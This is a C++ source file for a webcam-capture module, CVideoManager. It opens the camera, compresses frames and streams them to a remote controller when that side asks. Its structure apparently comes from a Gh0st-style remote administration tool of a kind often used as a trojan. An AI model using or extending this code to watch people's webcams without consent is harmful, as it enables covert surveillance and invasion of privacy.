// VideoManager.cpp: implementation of the CVideoManager class.
//
//////////////////////////////////////////////////////////////////////

#include "stdafx.h"
#include "VideoManager.h"
#include "Common.h"
#include <iostream>

//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

CVideoManager::CVideoManager(IOCPClient* ClientObject, int n) : CManager(ClientObject)
{
	m_bIsWorking = TRUE;

	m_bIsCompress = false;
	m_pVideoCodec = NULL;
	m_fccHandler = 1129730893;

	m_CapVideo.Open(0,0);  // 开启
	lpBuffer = NULL;

	m_hWorkThread = CreateThread(NULL, 0, 
		(LPTHREAD_START_ROUTINE)WorkThread, this, 0, NULL);
}


DWORD CVideoManager::WorkThread(LPVOID lParam)
{
	CVideoManager *This = (CVideoManager *)lParam;
	static DWORD	dwLastScreen = GetTickCount();

	if (This->Initialize())          //转到Initialize
	{
		This->m_bIsCompress=true;    //如果初始化成功就设置可以压缩
		printf("压缩视频进行传输.\n");
	}

	This->SendBitMapInfor();         //发送bmp位图结构

	// 等控制端对话框打开
	This->WaitForDialogOpen();
#if USING_ZLIB
	const int fps = 8;// 帧率
#elif USING_LZ4
	const int fps = 8;// 帧率
#else
	const int fps = 8;// 帧率
#endif
	const int sleep = 1000 / fps;// 间隔时间（ms）

	timeBeginPeriod(1);
	while (This->m_bIsWorking)
	{
		// 限制速度
		int span = sleep-(GetTickCount() - dwLastScreen);
		Sleep(span > 0 ? span : 1);
		if (span < 0)
			printf("SendScreen Span = %d ms\n", span);
		dwLastScreen = GetTickCount();
		if(FALSE == This->SendNextScreen())
			break;
	}
	timeEndPeriod(1);

	This->Destroy();
	std::cout<<"CVideoManager WorkThread end\n";

	return 0;
}

CVideoManager::~CVideoManager()
{
	InterlockedExchange((LPLONG)&m_bIsWorking, FALSE);
	m_CapVideo.m_bExit = TRUE;
	WaitForSingleObject(m_hWorkThread, INFINITE);
	CloseHandle(m_hWorkThread);
	std::cout<<"CVideoManager ~CVideoManager \n";
	if (m_pVideoCodec)   //压缩类
	{
		delete m_pVideoCodec;
		m_pVideoCodec = NULL;
	}
	if (lpBuffer)
		delete [] lpBuffer;
}

void CVideoManager::Destroy()
{
	m_bIsWorking = FALSE;
	std::cout<<"CVideoManager Destroy \n";
	if (m_pVideoCodec)   //压缩类
	{
		delete m_pVideoCodec;
		m_pVideoCodec = NULL;
	}
}

void CVideoManager::SendBitMapInfor()
{
	const int	dwBytesLength = 1 + sizeof(BITMAPINFO);
	BYTE szBuffer[dwBytesLength + 3] = { 0 };
	szBuffer[0] = TOKEN_WEBCAM_BITMAPINFO;
	memcpy(szBuffer + 1, m_CapVideo.GetBmpInfor(), sizeof(BITMAPINFO));
	m_ClientObject->OnServerSending((char*)szBuffer, dwBytesLength);
}

BOOL CVideoManager::SendNextScreen()
{
	DWORD dwBmpImageSize=0;
	LPVOID	lpDIB =m_CapVideo.GetDIB(dwBmpImageSize);
	if(lpDIB == NULL)
		return FALSE;

	// token + IsCompress + m_fccHandler + DIB
	const int nHeadLen = 1 + 1 + 4;

	UINT	nBufferLen = nHeadLen + dwBmpImageSize;
	lpBuffer = lpBuffer ? lpBuffer : new BYTE[nBufferLen];

	lpBuffer[0] = TOKEN_WEBCAM_DIB;
	lpBuffer[1] = m_bIsCompress;   //压缩

	memcpy(lpBuffer + 2, &m_fccHandler, sizeof(DWORD));     //这里将视频压缩码写入要发送的缓冲区

	UINT	nPacketLen = 0;
	if (m_bIsCompress && m_pVideoCodec) //这里判断，是否压缩，压缩码是否初始化成功，如果成功就压缩          
	{
		int	nCompressLen = 0;
		//这里压缩视频数据了
		bool bRet = m_pVideoCodec->EncodeVideoData((LPBYTE)lpDIB, 
			m_CapVideo.GetBmpInfor()->bmiHeader.biSizeImage, lpBuffer + nHeadLen, 
			&nCompressLen, NULL);
		if (!nCompressLen)
		{
			// some thing error
			return FALSE;
		}
		//重新计算发送数据包的大小  剩下就是发送了，我们到主控端看一下视频如果压缩了怎么处理
		//到主控端的void CVideoDlg::OnReceiveComplete(void)
		nPacketLen = nCompressLen + nHeadLen;
	}
	else
	{
		//不压缩  永远不来
		memcpy(lpBuffer + nHeadLen, lpDIB, dwBmpImageSize);
		nPacketLen = dwBmpImageSize+ nHeadLen;
	}
	m_CapVideo.SendEnd();    //copy  send

	m_ClientObject->OnServerSending((char*)lpBuffer, nPacketLen);

	return TRUE;
}


VOID CVideoManager::OnReceive(PBYTE szBuffer, ULONG ulLength)
{
	switch (szBuffer[0])
	{
	case COMMAND_NEXT:
		{
			NotifyDialogIsOpen();
			break;
		}
	case COMMAND_WEBCAM_ENABLECOMPRESS: // 要求启用压缩
		{
			// 如果解码器初始化正常，就启动压缩功能
			if (m_pVideoCodec)
				InterlockedExchange((LPLONG)&m_bIsCompress, true);
			printf("压缩视频进行传输.\n");
			break;
		}
	case COMMAND_WEBCAM_DISABLECOMPRESS: // 原始数据传输
		{
			InterlockedExchange((LPLONG)&m_bIsCompress, false);
			printf("不压缩视频进行传输.\n");
			break;
		}
	}
}

BOOL CVideoManager::Initialize()
{
	BOOL	bRet = TRUE;

	if (m_pVideoCodec!=NULL)         
	{                              
		delete m_pVideoCodec;
		m_pVideoCodec=NULL;           
	}
	if (m_fccHandler==0)         //不采用压缩
	{
		bRet= FALSE;
		return bRet;
	}
	m_pVideoCodec = new CVideoCodec;
	//这里初始化，视频压缩 ，注意这里的压缩码  m_fccHandler(到构造函数中查看)
	if (!m_pVideoCodec->InitCompressor(m_CapVideo.GetBmpInfor(), m_fccHandler))
	{
		delete m_pVideoCodec;
		bRet=FALSE;
		// 置NULL, 发送时判断是否为NULL来判断是否压缩
		m_pVideoCodec = NULL;
	}
	return bRet;
}
